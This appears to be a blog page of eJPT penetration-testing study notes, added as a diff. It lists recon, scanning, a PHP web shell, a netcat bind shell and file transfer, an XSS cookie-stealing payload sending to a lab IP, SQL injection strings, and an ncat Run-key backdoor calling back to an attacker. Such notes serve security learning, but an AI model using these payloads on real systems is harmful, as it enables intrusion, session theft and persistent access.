@@ -1,0 +1,1482 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>eLearnSecurity Junior Penetration Tester |</title>
+<meta name="description" content="Get your feet wet in Pentesting with eJPT from INE! ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="eLearnSecurity Junior Penetration Tester">
+<meta property="og:url" content="http://localhost:4000/notes/ejpt/">
+
+
+  <meta property="og:description" content="Get your feet wet in Pentesting with eJPT from INE! ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header5.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-18T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/ejpt/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header5.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          eLearnSecurity Junior Penetration Tester
+
+        
+      </h1>
+      
+        <p class="page__lead">Get your feet wet in Pentesting with eJPT from INE!
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  12 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/" class="active">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="eLearnSecurity Junior Penetration Tester">
+    <meta itemprop="description" content="Get your feet wet in Pentesting with eJPT from INE!">
+    <meta itemprop="datePublished" content="2023-11-18T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#my-review">My Review</a></li>
+  <li><a href="#gather-information">Gather information</a></li>
+  <li><a href="#port-scan">PORT SCAN</a></li>
+  <li><a href="#vulnerability-scan">VULNERABILITY SCAN</a></li>
+  <li><a href="#web-scan">Web Scan</a>
+    <ul>
+      <li><a href="#manual-fingerprint">MANUAL FINGERPRINT</a></li>
+      <li><a href="#nc">NC</a></li>
+      <li><a href="#bind-shell-with-netcat">Bind Shell with netcat:</a></li>
+      <li><a href="#dictionary-based-enumeration">Dictionary-based Enumeration</a></li>
+      <li><a href="#dirb">DIRB</a></li>
+      <li><a href="#xss">XSS</a></li>
+      <li><a href="#mysql-injection">MYSQL INJECTION</a></li>
+      <li><a href="#sqlmap">SQLMap</a></li>
+    </ul>
+  </li>
+  <li><a href="#system-atacks">System Atacks</a>
+    <ul>
+      <li><a href="#ncat">ncat</a></li>
+      <li><a href="#backdoor">backdoor</a></li>
+      <li><a href="#meterpreter">METERPRETER</a></li>
+      <li><a href="#john">JOHN</a></li>
+      <li><a href="#hashcat">HASHCAT</a></li>
+    </ul>
+  </li>
+  <li><a href="#network-attacks">NETWORK ATTACKS</a></li>
+  <li><a href="#shares">SHARES</a>
+    <ul>
+      <li><a href="#windows">Windows:</a></li>
+      <li><a href="#linux">Linux:</a></li>
+      <li><a href="#tools">TOOLS</a></li>
+    </ul>
+  </li>
+  <li><a href="#arp">ARP</a></li>
+  <li><a href="#meterpreter-1">METERPRETER</a></li>
+  <li><a href="#remote-code-executions">Remote Code Executions</a>
+    <ul>
+      <li><a href="#with-curl">with CURL</a></li>
+    </ul>
+  </li>
+  <li><a href="#privesc-wgelctf">PrivEsc WgelCTF</a>
+    <ul>
+      <li><a href="#create-shadow-file">Create shadow file</a></li>
+    </ul>
+  </li>
+  <li><a href="#extra-notes">Extra notes</a>
+    <ul>
+      <li><a href="#copy-cat-command">COPY cat command</a></li>
+      <li><a href="#better-shell">Better shell</a></li>
+      <li><a href="#gobuster---web-enumeration">GOBUSTER - WEB ENUMERATION</a></li>
+      <li><a href="#sqlmap-1">SQLMAP</a></li>
+      <li><a href="#grep">GREP</a></li>
+      <li><a href="#aureport">AUREPORT</a></li>
+    </ul>
+  </li>
+  <li><a href="#pivot">Pivot</a>
+    <ul>
+      <li><a href="#pivot-with-chisel">PIVOT with CHISEL</a></li>
+      <li><a href="#local-pivot">LOCAL PIVOT</a></li>
+      <li><a href="#reverse-socks">REVERSE SOCKS</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<p><img src="/assets/images/posts/2023-11-18-ejpt/eJPT-1.webp" alt="Alt text" /></p>
+
+<h1 id="my-review">My Review</h1>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Difficulty: ★☆☆☆☆</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Price: ★★★★☆</td>
+      <td>$249</td>
+    </tr>
+    <tr>
+      <td>Material: ★★☆☆☆</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Real-World Scenario: ★☆☆☆☆</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Worth it?: Yes, as a first cert</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Official Site: <a href="https://security.ine.com/certifications/ejpt-certification/">eJPT by INE</a></td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>This is eJPTv1, So I reckon that the material got better after the update</p>
+</blockquote>
+
+<blockquote>
+  <p>If you have zero experience with Pentesting, start with <strong>TryHackMe</strong>.
+Learn the basics then you are good to go!</p>
+</blockquote>
+
+<h1 id="gather-information">Gather information</h1>
+
+<p>on google:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>site: &lt;website&gt;
+</code></pre></div></div>
+
+<p>DNSdumpster.com
+VirusTotal</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctr.sh &lt;certificate search&gt;
+</code></pre></div></div>
+
+<p>on kali:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sublist3r <span class="nt">-d</span> &lt;domain&gt;
+subbrute 
+
+apt-get <span class="nb">install </span>snapd
+service snapd start
+snap <span class="nb">install </span>amass
+snap run amass <span class="nt">-ip</span> <span class="nt">-d</span> &lt;domain&gt;
+</code></pre></div></div>
+
+<h1 id="port-scan">PORT SCAN</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fping <span class="nt">-a</span> <span class="nt">-g</span> &lt;host&gt; 2&gt;/dev/null 
+</code></pre></div></div>
+<p>To get the ips that are UP, we can send to a file</p>
+
+<p>Nmap can execute the scan with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-iL</span> &lt;file&gt;.
+<span class="nt">-sS</span> - stealth scan 
+<span class="nt">-sT</span> - tcp scan <span class="o">&gt;</span> generates logs
+<span class="nt">-sV</span> - get versions <span class="o">&gt;</span> not as stealth but very useful
+<span class="nt">-O</span>  - Try to get OS
+<span class="nt">-iL</span> - get hosts by file
+<span class="nt">-Pn</span> - assumes all hosts are ups and try to scan
+<span class="nt">-p</span>  - port
+<span class="nt">-A</span>  - More profound scan
+</code></pre></div></div>
+
+<p>We can go with:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p-</span>  <span class="k">then</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-p</span> &lt;the ports&gt; <span class="nt">-A</span> <span class="o">&gt;</span> nmap.result
+</code></pre></div></div>
+
+<h1 id="vulnerability-scan">VULNERABILITY SCAN</h1>
+
+<ul>
+  <li>OpenVAS</li>
+  <li>Nexpose</li>
+  <li>GFI LAN Guard</li>
+  <li>Nessus</li>
+</ul>
+
+<p>List of various vuln scans:
+https://sectools.org/tag/vuln-scanners/</p>
+
+<h1 id="web-scan">Web Scan</h1>
+
+<h2 id="manual-fingerprint">MANUAL FINGERPRINT</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;target&gt; 80
+HEAD / HTTP/1.0
+&lt;space&gt;
+&lt;space&gt;
+</code></pre></div></div>
+
+<p>For https use openssl:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_client <span class="nt">-connect</span> &lt;target&gt;:443
+HEAD / HTTP/1.0
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httprint <span class="nt">-P0</span> <span class="nt">-h</span> &lt;target&gt; <span class="nt">-s</span> &lt;signature file&gt;
+<span class="nt">-P0</span> - to avoid pinging the host
+<span class="nt">-h</span> - target hosts
+</code></pre></div></div>
+
+<p>HTTP VERBS
+PUT</p>
+
+<p>to count in bytes how long your payload is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">wc</span> <span class="nt">-m</span> payload.php
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;target site&gt; 80
+PUT /payload.php hTTP/1.0
+Content-Type: text/html
+Content-lenght: 136 <span class="o">&gt;</span> value that we get with <span class="nb">wc</span> <span class="nt">-m</span> &lt;payload&gt;
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>PHP shell code: to use with PUT method:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]))</span>
+<span class="p">{</span>
+  <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
+  <span class="k">echo</span> <span class="s1">'&lt;pre&gt;'</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s1">'&lt;/pre&gt;'</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>After uploading this shell, we can go to the browser and use:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"?cmd=&lt;command&gt;"</span> 
+</code></pre></div></div>
+
+<h2 id="nc">NC</h2>
+
+<p>we can send files using netcat also:
+Receiver</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;port&gt; <span class="o">&gt;</span> output_file.txt
+</code></pre></div></div>
+
+<p>Sender</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'hello'</span> | nc <span class="nt">-v</span> &lt;ip&gt; &lt;port&gt;
+or
+<span class="nb">cat</span> &lt;file_u_Wanna_send&gt; | nc <span class="nt">-v</span> &lt;ip&gt; &lt;port&gt;
+</code></pre></div></div>
+
+<h2 id="bind-shell-with-netcat">Bind Shell with netcat:</h2>
+
+<p>in the server/listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;port&gt; <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p>in the client/sender:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-v</span> &lt;ip&gt; &lt;port&gt;
+</code></pre></div></div>
+
+<h2 id="dictionary-based-enumeration">Dictionary-based Enumeration</h2>
+<p>common backup file names are: .bak, .old, .txt and .xxx</p>
+
+<h2 id="dirb">DIRB</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-x</span> &lt;file of extensions&gt;
+<span class="nt">-X</span> <span class="s2">"extensions.bak, extensions.xxx"</span>
+<span class="nt">-z</span> delay <span class="k">in </span>miliseconds
+<span class="nt">-o</span> output a file
+<span class="nt">-p</span> proxy
+<span class="nt">-H</span> <span class="s2">"set a header"</span>
+<span class="nt">-u</span> basic authentication <span class="s2">"user:password"</span>
+<span class="nt">-c</span> <span class="s2">"set a cookie"</span>
+<span class="nt">-a</span> <span class="s2">"set a agent user"</span>
+</code></pre></div></div>
+
+<h2 id="xss">XSS</h2>
+<p>reflective &gt; can execute commands and get answer of output in the browser
+stored &gt; can send files to the server / get cookies for others users and steal sessions</p>
+
+<p>find a user input field:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># try to execute a html command like </span>
+&lt;h1&gt; teste &lt;/h1&gt;
+
+<span class="c"># try to execute JS command like </span>
+&lt;script&gt;alert<span class="o">(</span><span class="s1">'XSS'</span><span class="o">)</span><span class="p">;</span>&lt;/script&gt;
+</code></pre></div></div>
+
+<p>payload to steal cookies: XSS Stored
+we need to have a page to send the cookies, in this case we have get.php
+but in  real scenario we gottta have a page set up to be able to do that.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+var i <span class="o">=</span> new Image<span class="o">()</span><span class="p">;</span>
+i.src<span class="o">=</span><span class="s2">"http://192.168.99.11/get.php?cookies="</span>+document.cookie<span class="p">;</span> 
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>after that, we go to the ip 99.11 and get the file with the stolen cookie.</p>
+
+<h2 id="mysql-injection">MYSQL INJECTION</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or substr(user(), 1, 1) = '</span>a
+<span class="s1">' or substr(user(), 1, 1) = '</span>b
+</code></pre></div></div>
+
+<p>after finding the first letter</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">' or substr(user(), 2, 1) = '</span>a
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>go to the second one.</p>
+  </li>
+  <li>
+    <p>guessing the current user.</p>
+  </li>
+</ul>
+
+<h2 id="sqlmap">SQLMap</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> &lt;URL&gt; <span class="nt">-p</span> &lt;injection parameter&gt; <span class="o">[</span>options]
+</code></pre></div></div>
+
+<p>example:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'vulnerable url'</span> <span class="nt">-p</span> <span class="nb">id</span> <span class="nt">--technique</span><span class="o">=</span>U <span class="c">#using UNION</span>
+</code></pre></div></div>
+
+<p>with POST:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s1">'url'</span> <span class="nt">--data</span> &lt;post string&gt; <span class="nt">-p</span> parameter <span class="o">[</span>options] <span class="c"># u can get the post string with burp</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-b</span> - banner
+<span class="nt">--tables</span>
+<span class="nt">--current-db</span> &lt;name&gt;
+<span class="nt">--columns</span>
+<span class="nt">--dump</span>
+<span class="nt">-v3</span> <span class="nt">--fresh-queries</span> <span class="c"># to see what payload the sqlmap used</span>
+<span class="nt">--dbs</span> <span class="c"># to see the databases availables</span>
+<span class="nt">--users</span> <span class="c"># to see the users</span>
+<span class="nt">-D</span> <span class="c"># set the database of your choice</span>
+<span class="nt">-T</span> <span class="c"># set the tables of your choice</span>
+<span class="nt">-C</span> <span class="c"># set column of your choice</span>
+<span class="nt">-r</span> <span class="c"># request, we can get from burp</span>
+<span class="nt">--technique</span><span class="o">=</span>U <span class="c"># UNION attack</span>
+<span class="nt">--technique</span><span class="o">=</span>B <span class="c"># boolean-based attacks</span>
+<span class="nt">--flush-session</span> <span class="c"># if you need to clear the logs for a rerun test or smt like that #logs &gt; /usr/share/sqlmap/output/</span>
+</code></pre></div></div>
+
+<h1 id="system-atacks">System Atacks</h1>
+
+<h2 id="ncat">ncat</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-l  -listem
+-e  -execute file
+-p  -port
+-v  -verbose
+</code></pre></div></div>
+
+<h2 id="backdoor">backdoor</h2>
+
+<ul>
+  <li>copy ncat (with the right OS version) to the target</li>
+  <li>as WIndows\system32\winconfig.exe</li>
+  <li>go to regedit</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</code></pre></div></div>
+
+<p>New &gt; String Value
+Edit with the path of the ncat as winconfig follow by the ip of attacker and port to connect</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">-e</span> cmd.exe
+example: <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">ystem32</span><span class="se">\w</span><span class="s2">inconfig.exe &lt;IP&gt; &lt;PORT&gt; -e cmd.exe"</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># the persistence is set. </span>
+<span class="c"># We can listen in our attacker machine </span>
+ncat <span class="nt">-l</span> <span class="nt">-p</span> &lt;port&gt; <span class="nt">-v</span>
+</code></pre></div></div>
+
+<h2 id="meterpreter">METERPRETER</h2>
+<p>if u have a session already</p>
+
+<p>to get persistence:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/s4u_persistence
+</code></pre></div></div>
+
+<p>or</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/persistence
+set payload, session, lhost and port 
+set DisablePayloadHandler false
+set start SYSTEM
+</code></pre></div></div>
+
+<p>then we are able to open a session even after the reboot with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload, lhost and port
+</code></pre></div></div>
+
+<p>with meterpreter we can:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- screenshot &gt; to grab the screen of the target
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># [in the attack machine] </span>
+eog /path of the screenshoot
+download &lt;file&gt; or  <span class="s2">"/path"</span>
+upload &lt;file&gt; /path
+sysinfo
+ps <span class="c">#running proccess</span>
+<span class="nb">whoami</span> /priv
+<span class="nb">help</span> <span class="c">#to see all commands</span>
+hashdump
+search <span class="nt">-f</span> &lt;file&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getuid <span class="c">#WINXP-ftp</span>
+getsystem <span class="o">&gt;&gt;</span> this give us escalate privileges, now we are NT AUTHORITY<span class="se">\S</span>YSTEM
+getuid <span class="c">#AUTHORITY\SYSTEM</span>
+sysinfo
+</code></pre></div></div>
+
+<h2 id="john">JOHN</h2>
+<p>bruteforce:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">--list</span><span class="o">=</span>formats  <span class="c">#to see all formats available</span>
+</code></pre></div></div>
+
+<p>after get the shadow and passwd files:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unshadow passwd shadow <span class="o">&gt;</span> crackme
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-incremental</span> <span class="nt">-users</span>:victim crackme
+john <span class="nt">--show</span> crackme <span class="c">#to see the result</span>
+</code></pre></div></div>
+
+<p>dictionary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">-w</span><span class="o">=</span>/&lt;wordlist&gt; &lt;file&gt;
+<span class="nt">-rules</span> <span class="c">#to add mangling example PASSWORD in the wordlist, mangling = password, passw0rd etc</span>
+</code></pre></div></div>
+
